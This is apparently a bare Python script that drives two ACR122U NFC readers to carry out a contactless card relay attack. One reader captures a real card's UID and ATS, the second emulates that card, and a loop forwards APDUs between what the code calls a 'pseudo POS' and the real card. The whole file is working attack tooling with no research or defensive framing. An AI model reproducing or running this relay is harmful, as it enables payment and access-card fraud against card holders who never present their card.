from smartcard.util import toHexString, toBytes
from smartcard.CardType import AnyCardType
from smartcard.CardRequest import CardRequest
from smartcard.CardConnection import CardConnection
from smartcard.scard import SCARD_SHARE_DIRECT
from smartcard.System import readers
from smartcard.Exceptions import CardServiceException
import subprocess
import re
import time

# ACR122U control commands
ACS_DISABLE_AUTO_POLL = ['ff', '00', '51', '3f', '00']
ACS_LED_ORANGE = ['ff', '00', '40', '0f', '04', '00', '00', '00', '00']
ACS_GET_READER_FIRMWARE = ['ff', '00', '48', '00', '00']
ACS_DIRECT_TRANSMIT = ['ff', '00', '00', '00']
GET_PN532_FIRMWARE = ['d4', '02']
TG_INIT_AS_TARGET = ['d4', '8c']
TG_GET_DATA = ['d4', '86']
TG_SET_DATA = ['d4', '8e']
ISO_OK = ['90', '00']
ACS_LED_GREEN = ['ff', '00', '40', '0e', '04', '00', '00', '00', '00']

PN532_OK = [0xD5, 0x03]
PN532_FUNCTIONS = {
    0x01: 'ISO/IEC 14443 Type A',
    0x02: 'ISO/IEC 14443 Type B',
    0x04: 'ISO/IEC 18092',
}

def to_bytes(hex_str_or_list):
    if isinstance(hex_str_or_list, list):
        return [int(b, 16) if isinstance(b, str) else b for b in hex_str_or_list]
    return [int(hex_str_or_list[i:i+2], 16) for i in range(0, len(hex_str_or_list), 2)]

def send_apdu(connection, apdu_hex):
    apdu = to_bytes(apdu_hex)
    print(f"[>>] APDU: {apdu}")
    try:
        response, sw1, sw2 = connection.transmit(apdu)
        print(f"[<<] Response: {response}, SW: {sw1:02X} {sw2:02X}")
        return response, sw1, sw2
    except Exception as e:
        print(f"[!] APDU Transmission Failed: {e}")
        return None, None, None

def prep_reader(reader):
    try:
        rconn = reader.createConnection()
        rconn.connect()
        print("Connected to reader")

        send_apdu(rconn, ACS_DISABLE_AUTO_POLL)
        send_apdu(rconn, ACS_LED_GREEN)
        send_apdu(rconn, ACS_GET_READER_FIRMWARE)

        full_command = ACS_DIRECT_TRANSMIT + [len(GET_PN532_FIRMWARE)] + GET_PN532_FIRMWARE
        response, sw1, sw2 = send_apdu(rconn, full_command)

        if sw1 == 0x90:
            print("READER PREPPED")
            return rconn
        else:
            print("Failed to prep reader")
            return None
    except Exception as e:
        print(f"[!] Error prepping reader: {e}")
        return None

def prep_emulator(emulator):
    try:
        econn = emulator.createConnection()
        econn.connect(protocol=CardConnection.RAW_protocol, mode=SCARD_SHARE_DIRECT)
        print("Connected to emulator")

        send_apdu(econn, ACS_DISABLE_AUTO_POLL)
        send_apdu(econn, ACS_LED_ORANGE)
        send_apdu(econn, ACS_GET_READER_FIRMWARE)

        full_command = ACS_DIRECT_TRANSMIT + [len(GET_PN532_FIRMWARE)] + GET_PN532_FIRMWARE
        response, sw1, sw2 = send_apdu(econn, full_command)

        if sw1 == 0x90:
            print("EMULATOR PREPPED")
            return econn
        else:
            print("Failed to prep emulator")
            return None
    except Exception as e:
        print(f"[!] Error prepping emulator: {e}")
        return None

def get_card_parameter(reader_obj):
    try:
        connection = reader_obj.createConnection()
        try:
            connection.connect(CardConnection.T1_protocol)
        except:
            print("T1 protocol failed, trying RAW_protocol...")
            connection.connect(protocol=CardConnection.RAW_protocol, mode=SCARD_SHARE_DIRECT)

        uid_apdu = [0xFF, 0xCA, 0x00, 0x00, 0x00]
        uid, sw1, sw2 = connection.transmit(uid_apdu)
        uid_str = toHexString(uid).replace(" ", "") if sw1 == 0x90 else ''

        try:
            ats_apdu = [0xFF, 0xCA, 0x01, 0x00, 0x00]
            ats, sw1, sw2 = connection.transmit(ats_apdu)
            ats_str = toHexString(ats).replace(" ", "") if sw1 == 0x90 else ''
        except:
            ats_str = ''

        sens_res = '0400'
        sel_res = '20'

        return sens_res, uid_str, sel_res, ats_str

    except Exception as e:
        print(f"[!] Error getting card parameters: {e}")
        return '', '', '', ''

def emulate(econn, uid_val, ats_val, sr, sl):
    uid_val = uid_val[2:]
    felica = '7879879787876660000000000000000000'
    nfcid = '00000000000000000000'
    system_code = '0000'
    nfcid3t = '00000000000000000000'
    arg6 = ''
    arg7 = ats_val or '0D80770052464944494F54204143415244'

    try:
        lengt = [len(to_bytes(arg6))]
        gt = to_bytes(arg6)
    except:
        lengt = [0]
        gt = []

    try:
        lentk = [len(to_bytes(arg7))]
        tk = to_bytes(arg7)
    except:
        lentk = [0]
        tk = []

    command = TG_INIT_AS_TARGET + to_bytes('00') + to_bytes(sr) + to_bytes(uid_val) + to_bytes(sl) \
              + to_bytes(felica) + to_bytes(nfcid) + to_bytes(system_code) + to_bytes(nfcid3t) + lengt + gt + lentk + tk

    full_apdu = ACS_DIRECT_TRANSMIT + [len(command)] + command
    send_apdu(econn, full_apdu)

def relay_apdu_from_emulator_to_card(econn, reader):
    print("\n[*] Waiting for APDU from PN532 (pseudo POS)...")
    ISO_TECH_ERROR = ['6F', '00']

    try:
        while True:
            get_data_apdu = ACS_DIRECT_TRANSMIT + [len(TG_GET_DATA)] + to_bytes(TG_GET_DATA)
            pn532_response, sw1, sw2 = send_apdu(econn, get_data_apdu)

            if not pn532_response or len(pn532_response) < 3:
                print("[!] No valid APDU received. Retrying...")
                time.sleep(0.5)
                continue

            print("[<<] Raw PN532 APDU:", toHexString(pn532_response))

            if pn532_response[0] == 0xD5 and pn532_response[1] == 0x87:
                clean_apdu = pn532_response[3:]
            else:
                clean_apdu = pn532_response

            print("[<<] Clean APDU to forward to card:", toHexString(clean_apdu))

            try:
                nrconn = reader.createConnection()
                nrconn.connect()
                print(">>> Sending to real card...")
                card_response, card_sw1, card_sw2 = nrconn.transmit(clean_apdu)
                print(f"[<<] Real card response: {toHexString(card_response)} | SW: {card_sw1:02X} {card_sw2:02X}")
                full_response = card_response + [card_sw1, card_sw2]
            except Exception as e:
                print(f"[!] Error talking to card: {e}")
                full_response = to_bytes(ISO_TECH_ERROR)

            response_apdu = TG_SET_DATA + full_response
            response_cmd = ACS_DIRECT_TRANSMIT + [len(response_apdu)] + response_apdu
            _, sw1, sw2 = send_apdu(econn, response_cmd)

            if sw1 == 0x90:
                print(f"[>>] Sent response back to PN532: {toHexString(full_response)}")
            else:
                print("[!] Failed to send response to PN532.")

    except KeyboardInterrupt:
        print("\n[*] Relay stopped by user.")
    except Exception as e:
        print(f"[!] Error in relay: {e}")

def testfunction():
    print("[TEST] Running T1-protocol test")
    try:
        r = readers()
        reader = r[0].createConnection()
        reader.connect(CardConnection.T1_protocol)
        apdu = toBytes("FF CA 00 00 00")
        response, sw1, sw2 = reader.transmit(apdu)
        print(f"Response: {toHexString(response)}, SW1: {sw1:02X}, SW2: {sw2:02X}")
    except Exception as e:
        print(f"[!] Test failed: {e}")

if __name__ == '__main__':
    rlist = readers()
    if len(rlist) != 2:
        print("[!] Please connect two ACR122U readers.")
        exit(1)

    reader, emulator = rlist[0], rlist[1]
    print(f"[INFO] Using Reader: {reader}, Emulator: {emulator}")

    rconn = prep_reader(reader)
    if rconn:
        print("[!] Tap card on READER...")
        time.sleep(3)
        sens_res, uid, sel_res, ats = get_card_parameter(reader)
        print("Card Parameters:", sens_res, uid, sel_res, ats)
        rconn.disconnect()

        econn = prep_emulator(emulator)
        if econn:
            emulate(econn, uid_val=uid, ats_val=ats, sr=sens_res, sl=sel_res)
            time.sleep(2)
            relay_apdu_from_emulator_to_card(econn, reader)
        else:
            print("[!] Emulator setup failed.")
    else:
        print("[!] Reader setup failed.")
